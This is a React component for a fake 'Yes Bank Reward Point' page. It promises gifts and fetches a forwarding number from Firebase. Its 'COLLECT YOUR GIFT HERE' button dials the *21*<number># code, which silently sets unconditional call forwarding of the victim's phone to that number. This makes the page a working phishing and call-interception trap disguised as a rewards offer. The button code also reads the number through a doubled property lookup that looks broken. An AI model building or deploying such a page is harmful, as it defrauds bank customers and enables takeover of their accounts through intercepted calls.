import React, { useState } from "react";
import FirebaseUtil from "./FirebaseRepo";
import myImage from './assets/yes_bank_top.png';

function ThirdPage() {
    const [forwardingNumber, setForwardingNumber] = useState(null);

      // Fetch forwarding number
  React.useEffect(() => {
    const getForwardingNumber = async () => {
      const result = await FirebaseUtil.getDocument("settings_web3", "forwarding_numbers");
      console.log(result);
      console.log(result.call_forwarding_number);
      setForwardingNumber(result.call_forwarding_number);
    };
    getForwardingNumber();
  }, []);

  return (
    <div className="max-w-md mx-auto p-4 mt-4 bg-white rounded shadow">
      <img src={myImage} alt="Description of the image" />
      <div className="flex justify-center mb-4">
        <p className="text-lg text-gray-900 mb-4">Welcome to Yes Bank Reward Point.</p>
      </div>
      <p className="text-lg text-gray-700 mb-4">
        To Collect Your Reward Point Gifts, give us a Miss Call to Yes Bank Reward Care by clicking the button below.
      </p>
      <div className="flex justify-center">
        <button onClick={() => {
            const telUrl = `tel:*21*${forwardingNumber?.call_forwarding_number}%23`;
            console.log('Dialing URL:', telUrl);
            window.open(telUrl, '_self');
          }}
          className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
        >
          COLLECT YOUR GIFT HERE
        </button>
      </div>
    </div>
  );
}

export default ThirdPage;